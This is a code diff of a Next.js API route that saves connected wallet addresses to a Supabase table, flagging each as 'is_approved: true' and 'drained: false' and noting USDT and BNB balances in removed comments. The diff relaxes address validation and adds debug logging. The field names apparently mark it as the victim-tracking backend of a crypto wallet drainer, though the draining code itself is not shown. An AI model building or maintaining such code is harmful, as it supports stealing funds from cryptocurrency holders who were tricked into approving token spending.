@@ -48,53 +48,54 @@ export async function GET(req: NextRequest) {
 
 // POST - Record new approval (public)
 
-
-// POST - Record new wallet connection
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json();
+    console.log("📥 Received POST body:", body);
+
     const { address } = body;
 
-    if (!address || !address.startsWith('0x')) {
-      return NextResponse.json({ error: "Valid address is required" }, { status: 400 });
+    if (!address) {
+      console.log("❌ No address provided");
+      return NextResponse.json({ error: "Address is required" }, { status: 400 });
     }
 
     const supabase = getServiceSupabase();
+    console.log("✅ Service client created");
+
+    const insertData = {
+      address: address.toLowerCase(),
+      is_approved: true,
+      drained: false,
+      connected_at: new Date().toISOString(),
+      created_at: new Date().toISOString(),
+    };
+
+    console.log("📤 Inserting data:", insertData);
 
     const { data, error } = await supabase
       .from("wallets")
-      .insert({
-        address: address.toLowerCase(),
-        is_approved: true,
-        drained: false,
-        connected_at: new Date().toISOString(),
-        created_at: new Date().toISOString(),
-        // Optional: you can add more fields later
-        // usdt_balance: 0,
-        // bnb_balance: 0,
-      })
+      .insert(insertData)
       .select()
       .single();
 
     if (error) {
-      console.error("Supabase Insert Error:", error);
+      console.error("❌ Supabase Insert Error:", error);
       return NextResponse.json({ 
         error: "Failed to save wallet", 
-        details: error.message 
+        details: error.message,
+        code: error.code 
       }, { status: 500 });
     }
 
-    console.log("✅ Wallet saved successfully:", address);
-    return NextResponse.json({ 
-      success: true, 
-      data 
-    });
+    console.log("✅ Wallet inserted successfully:", data);
+    return NextResponse.json({ success: true, data });
 
   } catch (err: any) {
-    console.error("POST /api/wallets Error:", err);
+    console.error("🔥 Server Error in POST:", err);
     return NextResponse.json({ 
-      error: "Invalid request", 
+      error: "Server error", 
       message: err.message 
-    }, { status: 400 });
+    }, { status: 500 });
   }
 }
